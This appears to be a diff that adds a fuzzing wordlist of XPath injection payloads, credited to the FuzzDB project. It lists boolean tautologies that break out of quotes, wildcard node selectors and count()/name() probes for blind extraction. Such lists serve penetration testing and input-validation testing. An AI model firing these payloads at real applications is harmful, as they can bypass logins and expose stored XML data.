@@ -1,0 +1,15 @@
+# Source: FuzzDB (https://github.com/fuzzdb-project/fuzzdb/blob/master/attack/xpath/xpath-injection.txt)
+
+' or '1'='1
+' or ''='
+x' or 1=1 or 'x'='y
+/
+//
+//*
+*/*
+@*
+count(/child::node())
+x' or name()='username' or 'x'='y
+' and count(/*)=1 and '1'='1
+' and count(/@*)=1 and '1'='1
+' and count(/comment())=1 and '1'='1
